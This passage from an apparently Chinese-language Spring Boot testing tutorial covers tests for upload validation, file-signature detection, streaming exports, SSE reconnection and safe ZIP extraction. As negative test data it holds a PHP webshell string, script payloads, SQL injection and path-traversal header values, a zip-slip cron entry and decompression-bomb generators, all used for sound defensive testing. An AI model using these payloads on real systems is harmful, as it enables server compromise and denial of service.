                    width, height, java.awt.image.BufferedImage.TYPE_INT_RGB);
            var out = new ByteArrayOutputStream();
            javax.imageio.ImageIO.write(image, "jpg", out);
            return out.toByteArray();
        } catch (java.io.IOException e) {
            throw new IllegalStateException(e);
        }
    }

    /**
     * 產生一個解壓縮炸彈：巨大尺寸但檔案很小的 PNG。
     *
     * <p>★ 原理：PNG 用 DEFLATE 壓縮，而「全部同一個顏色」的資料壓縮率極高。
     * 20000×20000 的純黑圖只有幾十 KB，解碼後是 1.6 GB。
     *
     * <p>⚠️ 這個方法本身需要小心：{@code new BufferedImage(20000, 20000)}
     * 就會 OOM！所以要用 {@code ImageWriter} 逐列寫出，而不是先建一張圖。
     */
    static byte[] decompressionBombPng(int width, int height) {
        try {
            var out = new ByteArrayOutputStream();
            var writers = javax.imageio.ImageIO.getImageWritersByFormatName("png");
            var writer = writers.next();
            try (var ios = javax.imageio.ImageIO.createImageOutputStream(out)) {
                writer.setOutput(ios);
                // ★ 用 IIOImage + RenderedImage 的「逐列」寫法
                //   （完整實作較長，這裡示意；實務上可以直接用一個
                //     預先產生好的測試檔案放在 src/test/resources）
                var tile = new java.awt.image.BufferedImage(
                        width, 1, java.awt.image.BufferedImage.TYPE_BYTE_GRAY);
                var param = writer.getDefaultWriteParam();
                writer.prepareWriteSequence(null);
                for (int y = 0; y < height; y++) {
                    writer.writeToSequence(
                            new javax.imageio.IIOImage(tile, null, null), param);
                }
                writer.endWriteSequence();
            } finally {
                writer.dispose();
            }
            return out.toByteArray();
        } catch (Exception e) {
            // ⚠️ 不是每個 PNG writer 都支援 write sequence。
            //    最可靠的做法是把測試檔案 commit 進 src/test/resources：
            //      src/test/resources/security/decompression-bomb-20000x20000.png
            //    ★ 而且要在檔名裡寫明它是什麼，否則後人會以為它是垃圾而刪掉。
            throw new org.opentest4j.TestAbortedException(
                    "無法動態產生解壓縮炸彈，請改用 src/test/resources 的固定檔案", e);
        }
    }

    static boolean containsExifMarker(byte[] jpeg) {
        // FF E1 + "Exif"
        for (int i = 0; i < jpeg.length - 8; i++) {
            if ((jpeg[i] & 0xFF) == 0xFF && (jpeg[i + 1] & 0xFF) == 0xE1
                    && jpeg[i + 4] == 'E' && jpeg[i + 5] == 'x'
                    && jpeg[i + 6] == 'i' && jpeg[i + 7] == 'f') {
                return true;
            }
        }
        return false;
    }

    static int indexOf(byte[] haystack, byte[] needle) {
        outer:
        for (int i = 0; i <= haystack.length - needle.length; i++) {
            for (int j = 0; j < needle.length; j++) {
                if (haystack[i + j] != needle[j]) continue outer;
            }
            return i;
        }
        return -1;
    }

    static byte[] concat(byte[] a, byte[] b) {
        byte[] result = java.util.Arrays.copyOf(a, a.length + b.length);
        System.arraycopy(b, 0, result, a.length, b.length);
        return result;
    }

    static byte[] minimalZip(String entryName, String content) {
        try {
            var out = new ByteArrayOutputStream();
            try (var zip = new java.util.zip.ZipOutputStream(out)) {
                zip.putNextEntry(new java.util.zip.ZipEntry(entryName));
                zip.write(content.getBytes(StandardCharsets.UTF_8));
                zip.closeEntry();
            }
            return out.toByteArray();
        } catch (java.io.IOException e) {
            throw new IllegalStateException(e);
        }
    }

    /**
     * ⚠️ 產生含 GPS EXIF 的 JPEG 需要一個 metadata 程式庫
     * （{@code metadata-extractor} 只能讀不能寫；寫入要用
     * {@code apache commons-imaging}）。
     *
     * <p>★ 實務建議：把一張真的手機照片（縮到 100×100、含 GPS）
     * commit 進 {@code src/test/resources/security/photo-with-gps.jpg}。
     * 這比寫 80 行產生程式碼可靠得多，而且「它真的是手機拍的」這件事本身就有價值。
     */
    static byte[] jpegWithGpsExif(int w, int h, double lat, double lon) {
        try (var in = ProductImageControllerTest.class
                .getResourceAsStream("/security/photo-with-gps.jpg")) {
            if (in == null) {
                throw new org.opentest4j.TestAbortedException(
                        "缺少測試資源 /security/photo-with-gps.jpg");
            }
            return in.readAllBytes();
        } catch (java.io.IOException e) {
            throw new IllegalStateException(e);
        }
    }

    static org.springframework.test.web.servlet.request.RequestPostProcessor
            customer(String customerId) {
        return org.springframework.security.test.web.servlet.request
                .SecurityMockMvcRequestPostProcessors
                .user(example.shop.security.CurrentUser.customer(customerId));
    }
}
```

⚠️ **`realPng()` 這個輔助方法是這個測試類別最重要的部分。**
很多人寫 `new MockMultipartFile("file", "a.jpg", "image/jpeg", "fake".getBytes())`，
然後**所有測試都在測 415 的路徑**，而快樂路徑從來沒被執行過。

### 5.13.2 `ContentTypeDetector` 的參數化測試

```java
package example.shop.common.upload;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.Arguments;
import org.junit.jupiter.params.provider.MethodSource;

import java.util.stream.Stream;

import static org.assertj.core.api.Assertions.assertThat;

class ContentTypeDetectorTest {

    static Stream<Arguments> signatures() {
        return Stream.of(
            // ── 正例 ─────────────────────────────────────────────
            Arguments.of("JPEG (JFIF)", hex("FFD8FFE0 00104A46 49460001"),
                    ContentTypeDetector.DetectedType.JPEG),
            Arguments.of("JPEG (EXIF)", hex("FFD8FFE1 00164578 69660000"),
                    ContentTypeDetector.DetectedType.JPEG),
            Arguments.of("JPEG (raw)", hex("FFD8FFDB 00430003 02020302"),
                    ContentTypeDetector.DetectedType.JPEG),
            Arguments.of("PNG", hex("89504E47 0D0A1A0A 0000000D"),
                    ContentTypeDetector.DetectedType.PNG),
            Arguments.of("GIF87a", hex("47494638 37610100 01000000"),
                    ContentTypeDetector.DetectedType.GIF),
            Arguments.of("GIF89a", hex("47494638 39610100 01000000"),
                    ContentTypeDetector.DetectedType.GIF),
            Arguments.of("WebP", hex("52494646 24000000 57454250"),
                    ContentTypeDetector.DetectedType.WEBP),
            Arguments.of("PDF", hex("25504446 2D312E34 0A25E2E3"),
                    ContentTypeDetector.DetectedType.PDF),

            // ── 反例（★ 這些才是重點）───────────────────────────
            Arguments.of("PHP webshell", "<?php system($_GET['c']); ?>".getBytes(),
                    ContentTypeDetector.DetectedType.UNKNOWN),
            Arguments.of("HTML", "<html><script>alert(1)</script>".getBytes(),
                    ContentTypeDetector.DetectedType.UNKNOWN),
            Arguments.of("SVG（沒有 magic number，且刻意不支援 5.5.5）",
                    "<svg xmlns=\"http://www.w3.org/2000/svg\"><script/>".getBytes(),
                    ContentTypeDetector.DetectedType.UNKNOWN),
            Arguments.of("ZIP / xlsx（圖片端點不接受）", hex("504B0304 14000800 08000000"),
                    ContentTypeDetector.DetectedType.UNKNOWN),
            Arguments.of("ELF 執行檔", hex("7F454C46 02010100 00000000"),
                    ContentTypeDetector.DetectedType.UNKNOWN),
            Arguments.of("Windows PE", hex("4D5A9000 03000000 04000000"),
                    ContentTypeDetector.DetectedType.UNKNOWN),
            Arguments.of("空", new byte[0],
                    ContentTypeDetector.DetectedType.UNKNOWN),
            Arguments.of("只有 2 個 byte（不足以判定）", hex("FFD8"),
                    ContentTypeDetector.DetectedType.UNKNOWN),

            // ── 邊界：RIFF 但不是 WebP ★ ────────────────────────
            Arguments.of("RIFF WAVE（不是 WebP！）", hex("52494646 24000000 57415645"),
                    ContentTypeDetector.DetectedType.UNKNOWN),
            Arguments.of("RIFF AVI（不是 WebP！）", hex("52494646 24000000 41564920"),
                    ContentTypeDetector.DetectedType.UNKNOWN)
        );
    }

    @ParameterizedTest(name = "{0}")
    @MethodSource("signatures")
    void 判定(String description, byte[] head, ContentTypeDetector.DetectedType expected) {
        assertThat(ContentTypeDetector.detect(head))
                .as(description)
                .isEqualTo(expected);
    }

    @Test
    @DisplayName("null 不會爆")
    void nullInput() {
        assertThat(ContentTypeDetector.detect(null))
                .isEqualTo(ContentTypeDetector.DetectedType.UNKNOWN);
    }

    @Test
    @DisplayName("probe 之後輸入流還能從頭讀 ★")
    void probe保留位元組() throws Exception {
        byte[] original = hex("89504E47 0D0A1A0A 0000000D 49484452 EEEEEEEE");
        var in = new java.io.ByteArrayInputStream(original);

        var probe = ContentTypeDetector.probe(in);

        assertThat(probe.type()).isEqualTo(ContentTypeDetector.DetectedType.PNG);
        // ★ 這是關鍵斷言：讀完 probe 之後，流還是完整的
        assertThat(probe.stream().readAllBytes())
                .as("probe 不可以吃掉位元組，否則儲存下來的檔案會缺頭")
                .isEqualTo(original);
    }

    @Test
    @DisplayName("probe 對小於 PROBE_BYTES 的輸入也能運作")
    void probe短輸入() throws Exception {
        byte[] original = hex("FFD8FF");
        var probe = ContentTypeDetector.probe(new java.io.ByteArrayInputStream(original));

        assertThat(probe.type()).isEqualTo(ContentTypeDetector.DetectedType.JPEG);
        assertThat(probe.stream().readAllBytes()).isEqualTo(original);
    }

    /** 把 "FFD8FFE0 0010" 這種可讀的 hex 字串轉成 byte[]。 */
    static byte[] hex(String spaced) {
        String clean = spaced.replaceAll("\\s", "");
        return java.util.HexFormat.of().parseHex(clean);
    }
}
```

⚠️ **「RIFF WAVE 不是 WebP」這兩個測試案例值得說明**：
`RIFF` 是一個容器格式，WebP、WAV、AVI 都用它。
只檢查前 4 個 byte 會把 WAV 檔判定成 WebP —— 所以簽章必須包含 offset 8 的 `WEBP`。
**這種「同前綴不同格式」的錯誤只有反例測試才抓得到。**

### 5.13.3 串流的測試

```java
package example.shop.order.web;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.test.web.servlet.MvcResult;

import java.nio.charset.StandardCharsets;

import static org.assertj.core.api.Assertions.assertThat;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.*;

/**
 * 串流匯出的測試。
 *
 * <p>⚠️ MockMvc 對非同步回應有一個必須知道的細節：
 * {@code StreamingResponseBody} 是 async 的，所以要用
 * {@code asyncDispatch(result)} 才能拿到真正的 body。
 * 忘記這一步的話 {@code getContentAsString()} 會是空字串 ——
 * 而測試會「通過」（因為你斷言的是狀態碼），
 * <b>但你什麼都沒測到</b>。
 */
@SpringBootTest
@AutoConfigureMockMvc
class OrderCsvExportControllerTest {

    @Autowired MockMvc mockMvc;

    @Test
    @DisplayName("CSV 匯出：標頭正確、有 BOM、有摘要列")
    void 匯出成功() throws Exception {
        MvcResult started = mockMvc.perform(get("/orders.csv")
                        .param("createdFrom", "2026-07-01")
                        .param("createdTo", "2026-08-01")
                        .accept("text/csv")
                        .with(support("stf_1")))
                .andExpect(request().asyncStarted())         // ★ 確認真的走 async
                .andReturn();

        // ★ 這一步是必須的
        String body = mockMvc.perform(
                        org.springframework.test.web.servlet.request.MockMvcRequestBuilders
                                .asyncDispatch(started))
                .andExpect(status().isOk())
                .andExpect(header().string("Content-Type",
                        org.hamcrest.Matchers.startsWith("text/csv")))
                // ★ 中文檔名的兩種寫法都在（5.8.1）
                .andExpect(header().string("Content-Disposition",
                        org.hamcrest.Matchers.allOf(
                                org.hamcrest.Matchers.containsString("filename=\""),
                                org.hamcrest.Matchers.containsString("filename*=UTF-8''"))))
                .andExpect(header().string("Cache-Control",
                        org.hamcrest.Matchers.containsString("no-store")))
                .andExpect(header().exists("X-Total-Count"))
                .andReturn()
                .getResponse()
                .getContentAsString(StandardCharsets.UTF_8);

        // ★ BOM（Excel 需要它）
        assertThat(body).startsWith("\uFEFF");        // ★ UTF-8 BOM
        // ★ 標題列
        assertThat(body).contains("訂單編號,客戶編號");
        // ★ 摘要列（5.9.4 的完整性標記）
        assertThat(body).contains("#SUMMARY,COMPLETE");
        // ★ CRLF（RFC 4180）
        assertThat(body).contains("\r\n");
    }

    @Test
    @DisplayName("超過同步上限 → 413 並指向非同步端點 ★")
    void 超過上限() throws Exception {
        // 假設測試資料有 25,000 筆
        mockMvc.perform(get("/orders.csv")
                        .param("createdFrom", "2020-01-01")
                        .param("createdTo", "2026-08-01")
                        .accept("text/csv")
                        .with(support("stf_1")))
                .andExpect(status().isPayloadTooLarge())
                .andExpect(jsonPath("$.code").value("PAYLOAD_TOO_LARGE"))
                .andExpect(jsonPath("$.matchedRows").exists())
                .andExpect(jsonPath("$.maxSyncRows").value(20000))
                // ★ 關鍵：錯誤訊息要指出替代方案（不只說「你錯了」）
                .andExpect(jsonPath("$.alternative.method").value("POST"))
                .andExpect(jsonPath("$.alternative.path").value("/order-exports"));
    }

    @Test
    @DisplayName("0 筆也回一個只有標題列的 CSV（不是 204 也不是 404）")
    void 零筆() throws Exception {
        MvcResult started = mockMvc.perform(get("/orders.csv")
                        .param("createdFrom", "1990-01-01")
                        .param("createdTo", "1990-01-02")
                        .accept("text/csv")
                        .with(support("stf_1")))
                .andReturn();

        String body = mockMvc.perform(
                        org.springframework.test.web.servlet.request.MockMvcRequestBuilders
                                .asyncDispatch(started))
                .andExpect(status().isOk())
                .andReturn().getResponse().getContentAsString(StandardCharsets.UTF_8);

        assertThat(body).contains("訂單編號");
        assertThat(body).contains("#SUMMARY,COMPLETE,expected=0,written=0");
    }

    @Test
    @DisplayName("客戶只能匯出自己的訂單（授權在 mapper.toQuery 裡）★")
    void 授權() throws Exception {
        MvcResult started = mockMvc.perform(get("/orders.csv")
                        .param("createdFrom", "2026-07-01")
                        .param("createdTo", "2026-08-01")
                        // ⚠️ 客戶試圖指定別人的 customerId
                        .param("customerId", "cus_someone_else")
                        .accept("text/csv")
                        .with(customer("cus_1")))
                .andReturn();

        String body = mockMvc.perform(
                        org.springframework.test.web.servlet.request.MockMvcRequestBuilders
                                .asyncDispatch(started))
                .andReturn().getResponse().getContentAsString(StandardCharsets.UTF_8);

        // ★ 結果裡不該有別人的訂單
        assertThat(body).doesNotContain("cus_someone_else");
    }

    @Test
    @DisplayName("串流回應不會被 RequestLoggingFilter 包裝 ★")
    void 不被包裝() throws Exception {
        // ★ 這個測試驗證 5.9.6 的規則有效。
        //   做法：斷言沒有出現那個 WARN。
        var logCaptor = nl.altindag.log.LogCaptor.forClass(
                example.shop.common.web.RequestLoggingFilter.class);

        MvcResult started = mockMvc.perform(get("/orders.csv")
                        .param("createdFrom", "2026-07-01")
                        .param("createdTo", "2026-08-01")
                        .accept("text/csv")
                        .with(support("stf_1")))
                .andReturn();
        mockMvc.perform(org.springframework.test.web.servlet.request.MockMvcRequestBuilders
                        .asyncDispatch(started));

        assertThat(logCaptor.getWarnLogs())
                .as("串流回應被包裝了 —— StreamingRequests 的規則沒涵蓋這個路徑")
                .noneMatch(m -> m.contains("串流回應被包裝了"));
    }

    @Test
    @DisplayName("NDJSON 的最後一行是 sentinel")
    void ndjson完整性() throws Exception {
        MvcResult started = mockMvc.perform(get("/orders.ndjson")
                        .param("createdFrom", "2026-07-01")
                        .param("createdTo", "2026-08-01")
                        .accept("application/x-ndjson")
                        .with(support("stf_1")))
                .andReturn();

        String body = mockMvc.perform(
                        org.springframework.test.web.servlet.request.MockMvcRequestBuilders
                                .asyncDispatch(started))
                .andExpect(status().isOk())
                .andReturn().getResponse().getContentAsString(StandardCharsets.UTF_8);

        String[] lines = body.strip().split("\n");
        // ★ 每一行都必須是合法的 JSON
        var objectMapper = new com.fasterxml.jackson.databind.ObjectMapper();
        for (String line : lines) {
            objectMapper.readTree(line);        // 拋例外就是測試失敗
        }
        // ★ 最後一行是 sentinel
        var last = objectMapper.readTree(lines[lines.length - 1]);
        assertThat(last.get("_eof").asBoolean()).isTrue();
        assertThat(last.get("count").asLong()).isEqualTo(lines.length - 1);
    }

    // 輔助方法略（同 5.13.1 的 customer / support）
}
```

⚠️ **`request().asyncStarted()` 的斷言看起來多餘，其實很重要**：
如果有人把 `StreamingResponseBody` 改成 `byte[]`（「反正測試會過」），
這個斷言會失敗 —— 它守住了「這個端點必須是串流的」這個設計決定。

### 5.13.4 SSE 的測試

```java
package example.shop.order.web;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.boot.test.web.server.LocalServerPort;
import org.springframework.http.MediaType;
import org.springframework.web.reactive.function.client.WebClient;

import java.time.Duration;
import java.util.ArrayList;
import java.util.List;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * SSE 的整合測試。
 *
 * <p>⚠️ 為什麼不用 MockMvc：MockMvc 沒有真的網路連線，
 * 而 SSE 的重點（長連線、心跳、斷線）都需要真的 socket。
 *
 * <p>★ 用 {@code WebClient}（reactive）當客戶端最方便 ——
 * 它原生支援 {@code ServerSentEvent} 的解析。
 * ⚠️ 這需要 {@code spring-webflux} 在 <b>test</b> scope，
 * <b>不是</b> main scope（我們的服務是 MVC，不要不小心把 WebFlux 帶進正式環境）。
 */
@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)
class OrderEventStreamControllerTest {

    @LocalServerPort int port;

    @Autowired example.shop.order.service.SseEmitterRegistry registry;
    @Autowired example.shop.order.service.OrderEventStreamService streamService;

    private WebClient client() {
        return WebClient.builder()
                .baseUrl("http://localhost:" + port)
                .defaultHeader("Authorization", "Bearer " + testToken("cus_1"))
                .build();
    }

    @Test
    @DisplayName("連上之後立刻收到 connected 註解與 retry")
    void 連線建立() {
        List<String> raw = new ArrayList<>();

        var disposable = client().get()
                .uri("/orders/ord_1/events")
                .accept(MediaType.TEXT_EVENT_STREAM)
                .retrieve()
                .bodyToFlux(String.class)
                .take(Duration.ofSeconds(2))
                .doOnNext(raw::add)
                .subscribe();

        try {
            // ★ 等連線建立（用 Awaitility 而不是 Thread.sleep）
            org.awaitility.Awaitility.await()
                    .atMost(Duration.ofSeconds(5))
                    .until(() -> registry.size() > 0);

            assertThat(registry.size()).isEqualTo(1);
        } finally {
            disposable.dispose();
        }

        // ★ 客戶端斷線後 registry 必須被清空（onCompletion）
        org.awaitility.Awaitility.await()
                .atMost(Duration.ofSeconds(10))
                .untilAsserted(() -> assertThat(registry.size()).isZero());
    }

    @Test
    @DisplayName("狀態改變時收到事件 ★")
    void 收到事件() {
        List<org.springframework.http.codec.ServerSentEvent<String>> events =
                java.util.Collections.synchronizedList(new ArrayList<>());

        var disposable = client().get()
                .uri("/orders/ord_1/events")
                .accept(MediaType.TEXT_EVENT_STREAM)
                .retrieve()
                .bodyToFlux(new org.springframework.core.ParameterizedTypeReference<
                        org.springframework.http.codec.ServerSentEvent<String>>() {})
                .doOnNext(events::add)
                .subscribe();

        try {
            org.awaitility.Awaitility.await().until(() -> registry.size() > 0);

            // 觸發一個事件
            streamService.publishStatusChange("ord_1", "PAID", "SHIPPED");

            org.awaitility.Awaitility.await()
                    .atMost(Duration.ofSeconds(5))
                    .untilAsserted(() -> assertThat(events)
                            .anyMatch(e -> "order.status.changed".equals(e.event())));

            var event = events.stream()
                    .filter(e -> "order.status.changed".equals(e.event()))
                    .findFirst().orElseThrow();

            // ★ 事件 ID 的格式（5.11.5）
            assertThat(event.id()).matches("^evt_\\d{12}$");
            assertThat(event.data()).contains("SHIPPED");
        } finally {
            disposable.dispose();
        }
    }

    @Test
    @DisplayName("Last-Event-ID 會補送遺漏的事件 ★")
    void 斷線續傳() {
        // ① 先產生 3 個事件
        streamService.publishStatusChange("ord_2", "PENDING_PAYMENT", "PAID");
        streamService.publishStatusChange("ord_2", "PAID", "SHIPPED");
        streamService.publishStatusChange("ord_2", "SHIPPED", "DELIVERED");

        // ② 帶 Last-Event-ID 連上（假裝我們只收到第 1 個）
        List<org.springframework.http.codec.ServerSentEvent<String>> events =
                java.util.Collections.synchronizedList(new ArrayList<>());

        var disposable = client().get()
                .uri("/orders/ord_2/events")
                .accept(MediaType.TEXT_EVENT_STREAM)
                .header("Last-Event-ID", "evt_000000000001")
                .retrieve()
                .bodyToFlux(new org.springframework.core.ParameterizedTypeReference<
                        org.springframework.http.codec.ServerSentEvent<String>>() {})
                .doOnNext(events::add)
                .subscribe();

        try {
            org.awaitility.Awaitility.await()
                    .atMost(Duration.ofSeconds(5))
                    .untilAsserted(() -> assertThat(events)
                            .filteredOn(e -> e.id() != null)
                            .hasSizeGreaterThanOrEqualTo(2));

            // ★ 補送了第 2、3 個，沒有重送第 1 個
            assertThat(events)
                    .filteredOn(e -> e.id() != null)
                    .extracting(org.springframework.http.codec.ServerSentEvent::id)
                    .doesNotContain("evt_000000000001")
                    .contains("evt_000000000002", "evt_000000000003");
        } finally {
            disposable.dispose();
        }
    }

    @Test
    @DisplayName("格式錯誤的 Last-Event-ID 不會讓連線失敗 ★")
    void 惡意LastEventId() {
        // ⚠️ Last-Event-ID 來自客戶端，可能是任何東西
        for (String malicious : List.of(
                "'; DROP TABLE order_event; --",
                "evt_" + "9".repeat(100),
                "../../etc/passwd",
                "evt_abc\r\nid: fake",
                "")) {

            var disposable = client().get()
                    .uri("/orders/ord_1/events")
                    .accept(MediaType.TEXT_EVENT_STREAM)
                    .header("Last-Event-ID", malicious)
                    .retrieve()
                    .bodyToFlux(String.class)
                    .take(Duration.ofSeconds(1))
                    .subscribe();
            try {
                // ★ 只要能連上就算通過（不該回 400 / 500）
                org.awaitility.Awaitility.await()
                        .atMost(Duration.ofSeconds(5))
                        .until(() -> registry.size() > 0);
            } finally {
                disposable.dispose();
            }
            org.awaitility.Awaitility.await().until(() -> registry.size() == 0);
        }
    }

    @Test
    @DisplayName("每個 actor 的連線數上限（5.11.6）")
    void 連線數上限() {
        List<reactor.core.Disposable> connections = new ArrayList<>();
        try {
            // 開 10 條（上限）
            for (int i = 0; i < 10; i++) {
                connections.add(client().get()
                        .uri("/orders/ord_1/events")
                        .accept(MediaType.TEXT_EVENT_STREAM)
                        .retrieve()
                        .bodyToFlux(String.class)
                        .subscribe());
            }
            org.awaitility.Awaitility.await()
                    .atMost(Duration.ofSeconds(10))
                    .until(() -> registry.size() == 10);

            // 第 11 條應該被拒絕
            org.assertj.core.api.Assertions.assertThatThrownBy(() ->
                    client().get()
                            .uri("/orders/ord_1/events")
                            .accept(MediaType.TEXT_EVENT_STREAM)
                            .retrieve()
                            .bodyToFlux(String.class)
                            .blockFirst(Duration.ofSeconds(5)))
                    .hasMessageContaining("503");
        } finally {
            connections.forEach(reactor.core.Disposable::dispose);
        }
    }

    @Test
    @DisplayName("關閉時所有連線收到 stream.reconnect 且 registry 清空")
    void 優雅關閉() {
        var disposable = client().get()
                .uri("/orders/ord_1/events")
                .accept(MediaType.TEXT_EVENT_STREAM)
                .retrieve()
                .bodyToFlux(String.class)
                .subscribe();
        try {
            org.awaitility.Awaitility.await().until(() -> registry.size() > 0);

            registry.shutdown();          // 模擬 @PreDestroy

            assertThat(registry.size()).isZero();
        } finally {
            disposable.dispose();
        }
    }

    private String testToken(String customerId) { /* 09 站會補完 */ return "test"; }
}
```

⚠️ **這個測試類別最重要的斷言是「`registry.size()` 最後一定回到 0」。**
它抓的是**連線洩漏** —— 而那是 SSE 最常見也最難發現的 bug
（症狀是「跑了三天之後服務接受不了新請求」）。

**把它做成一個共用的 `@AfterEach`**：

```java
    /**
     * ★ 每個 SSE 測試之後都檢查 registry 已清空。
     *
     * <p>放在 {@code @AfterEach} 而不是每個測試裡，
     * 讓「忘記寫這個斷言」變成不可能。
     */
    @org.junit.jupiter.api.AfterEach
    void 檢查沒有洩漏() {
        org.awaitility.Awaitility.await()
                .atMost(Duration.ofSeconds(10))
                .untilAsserted(() -> assertThat(registry.size())
                        .as("測試結束後仍有 SSE 連線 —— onCompletion 沒被呼叫？")
                        .isZero());
    }
```

### 5.13.5 `SafeZip` 的測試

```java
package example.shop.common.upload;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.util.ArrayList;
import java.util.List;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

class SafeZipTest {

    @Test
    @DisplayName("正常的 ZIP 可以逐個讀出")
    void 正常() throws Exception {
        byte[] zip = zipOf(
                entry("orders.csv", "a,b,c\n1,2,3\n"),
                entry("readme.txt", "說明"));

        List<String> names = new ArrayList<>();
        List<String> contents = new ArrayList<>();

        SafeZip.forEachEntry(new ByteArrayInputStream(zip), (name, in) -> {
            names.add(name);
            contents.add(new String(in.readAllBytes(), java.nio.charset.StandardCharsets.UTF_8));
        });

        assertThat(names).containsExactly("orders.csv", "readme.txt");
        assertThat(contents.get(0)).isEqualTo("a,b,c\n1,2,3\n");
    }

    @Test
    @DisplayName("Zip Slip：條目名稱的路徑被剝掉 ★")
    void zipSlip() throws Exception {
        byte[] zip = zipOf(entry("../../../../etc/cron.d/evil", "* * * * * root sh -c ..."));

        List<String> names = new ArrayList<>();
        SafeZip.forEachEntry(new ByteArrayInputStream(zip),
                (name, in) -> { names.add(name); in.readAllBytes(); });

        assertThat(names).hasSize(1);
        assertThat(names.get(0))
                .doesNotContain("..")
                .doesNotContain("/")
                .isEqualTo("evil.dat");        // 沒有副檔名 → fallback
    }

    @Test
    @DisplayName("單一條目超過上限 → 拒絕（而且是在讀完之前）★")
    void 單一條目過大() throws Exception {
        // ★ 50 MB 的上限，我們塞 60 MB 的可壓縮內容
        byte[] zip = zipOf(entry("big.txt", "A".repeat(60 * 1024 * 1024)));

        assertThatThrownBy(() ->
                SafeZip.forEachEntry(new ByteArrayInputStream(zip),
                        (name, in) -> in.readAllBytes()))
                .isInstanceOf(ImageRejectedException.class)
                .hasMessageContaining("exceeds");
    }

    @Test
    @DisplayName("壓縮比異常 → 拒絕 ★")
    void 壓縮炸彈() throws Exception {
        // ★ 全部同一個字元 → 壓縮比極高（約 1000:1）
        byte[] zip = zipOf(entry("bomb.txt", "A".repeat(20 * 1024 * 1024)));
        // 檔案本身很小
        assertThat(zip.length).isLessThan(100_000);

        assertThatThrownBy(() ->
                SafeZip.forEachEntry(new ByteArrayInputStream(zip),
                        (name, in) -> in.readAllBytes()))
                .isInstanceOf(ImageRejectedException.class);
    }

    @Test
    @DisplayName("條目數過多 → 拒絕")
    void 條目過多() throws Exception {
        var entries = new java.util.ArrayList<Entry>();
        for (int i = 0; i < 1500; i++) {
            entries.add(entry("f" + i + ".txt", "x"));
        }
        byte[] zip = zipOf(entries.toArray(new Entry[0]));

        assertThatThrownBy(() ->
                SafeZip.forEachEntry(new ByteArrayInputStream(zip),
                        (name, in) -> in.readAllBytes()))
                .isInstanceOf(ImageRejectedException.class)
                .hasMessageContaining("more than");
    }

    @Test
    @DisplayName("handler 沒讀完的條目也會被計入總量 ★")
    void handler沒讀完() throws Exception {
        // ⚠️ 這個測試守的是 SafeZip 裡的 counting.drain()：
        //    如果 handler 只讀了 10 bytes 就 return，
        //    剩下的還是要讀掉（才能算總量，也才能移到下一個 entry）
        byte[] zip = zipOf(
                entry("a.txt", "A".repeat(1024 * 1024)),
                entry("b.txt", "B".repeat(1024 * 1024)));

        List<String> names = new ArrayList<>();
        SafeZip.forEachEntry(new ByteArrayInputStream(zip), (name, in) -> {
            names.add(name);
            in.read(new byte[10]);        // ★ 故意只讀 10 bytes
        });

        // ★ 兩個條目都要被走訪到
        assertThat(names).containsExactly("a.txt", "b.txt");
    }

    @Test
    @DisplayName("宣告的大小被篡改也不影響判斷 ★")
    void 假的size() throws Exception {
        // ⚠️ 這個測試需要手動組 ZIP（把 header 裡的 size 寫成假的）。
        //    最實用的做法是把一個預先做好的檔案 commit 進 test resources：
        //      src/test/resources/security/lying-size.zip
        var resource = getClass().getResourceAsStream("/security/lying-size.zip");
        org.junit.jupiter.api.Assumptions.assumeTrue(resource != null,
                "缺少測試資源 /security/lying-size.zip");

        assertThatThrownBy(() ->
                SafeZip.forEachEntry(resource, (name, in) -> in.readAllBytes()))
                .isInstanceOf(ImageRejectedException.class);
    }

    // ── 輔助 ─────────────────────────────────────────────────────

    record Entry(String name, String content) {}

    static Entry entry(String name, String content) { return new Entry(name, content); }

    static byte[] zipOf(Entry... entries) throws Exception {
        var out = new ByteArrayOutputStream();
        try (var zip = new ZipOutputStream(out)) {
            for (Entry e : entries) {
                zip.putNextEntry(new ZipEntry(e.name()));
                zip.write(e.content().getBytes(java.nio.charset.StandardCharsets.UTF_8));
                zip.closeEntry();
            }
        }
        return out.toByteArray();
    }
}
```

### 5.13.6 測試金字塔

| 層 | 測什麼 | 數量 | 工具 |
|---|---|---|---|
| **單元** | `SafeFilename`、`ContentTypeDetector`、`CsvWriter`、`ContentDispositions`、`QueryMasker`、`SafeZip`、`OrderEventReplayService.parseSequence` | 約 90 個 | JUnit 參數化 |
| **切片** | 上傳端點的 415 / 413 / 422 路徑、下載的 `Content-Disposition` | 約 30 個 | `@WebMvcTest` + `MockMultipartFile` |
| **整合** | 串流的 async dispatch、匯出工作的完整生命週期、SSE 的連線與事件 | 約 20 個 | `@SpringBootTest` + `WebClient` |
| **安全** | 路徑穿越、polyglot、解壓縮炸彈、EXIF、公式注入、IDOR | 約 25 個 | 上面各層都有 |
| **容量** | 串流的記憶體、SSE 的連線洩漏 | 3 個 | 手動 / nightly |

⚠️ **「安全」不是一個獨立的層，而是散佈在各層的一組案例。**
把它們用 `@Nested class 安全` 或 `@Tag("security")` 標記起來，
就能在 CI 裡單獨跑（而且新人一眼看得出哪些測試在守什麼）。

**這一章需要的測試資源檔案**（commit 進 repo）：

```
src/test/resources/security/
├── README.md                              ★ 說明每個檔案是什麼、為什麼在這裡
├── photo-with-gps.jpg                     含 GPS EXIF 的真實照片（100×100）
├── decompression-bomb-20000x20000.png     41 KB → 1.6 GB
├── polyglot-jpeg-zip.jpg                  同時是 JPEG 與 ZIP
├── lying-size.zip                         header 的 size 被篡改
├── zip-slip.zip                           條目名稱含 ../
